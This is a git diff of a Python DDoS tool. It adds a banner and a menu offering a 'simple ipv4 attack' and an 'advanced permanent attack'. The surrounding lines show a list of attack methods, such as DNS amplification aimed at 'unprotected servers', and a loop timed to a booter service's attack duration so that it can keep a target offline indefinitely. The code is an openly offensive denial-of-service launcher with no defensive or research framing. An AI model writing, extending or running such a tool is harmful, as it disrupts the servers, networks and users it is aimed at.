@@ -2,6 +2,23 @@ import requests
 import time
 import json
 
+def main():
+    print("""          _______  _        _______  _______  _______  _______ 
+|\     /|(  ____ \( \      (  ____ \(  ___  )(       )(  ____ \
+| )   ( || (    \/| (      | (    \/| (   ) || () () || (    \/
+| | _ | || (__    | |      | |      | |   | || || || || (__    
+| |( )| ||  __)   | |      | |      | |   | || |(_)| ||  __)   
+| || || || (      | |      | |      | |   | || |   | || (      
+| () () || (____/\| (____/\| (____/\| (___) || )   ( || (____/\
+(_______)(_______/(_______/(_______/(_______)|/     \|(_______/""")
+    choose = input("""\nWhich tool would you like to use?
+
+[1] Simple ipv4 attack
+[2] Advanced permanent attack""")
+    if choose == "1":
+        ddos()
+    if choose == "2":
+        ddosperm()
 
 def ddos():
     methodlist = """1	DNS	IPv4 (L3 ,L4)	Method based on Domain Name System, have bigest amplification power. Recomended for home connection, unprotected servers.
@@ -203,12 +220,4 @@ def ddosperm():
         time.sleep(3620)  # Set this to whatever your maximum boot time on zdstresser.net is + 20 seconds for latency
 
 
-def queryofloop():
-    loopornot = input("\nTemporary outage or permanent? [T:P]")
-    if loopornot == "t":
-        ddos()
-    elif loopornot == "p":
-        ddosperm()
-
-
-queryofloop()
+main()
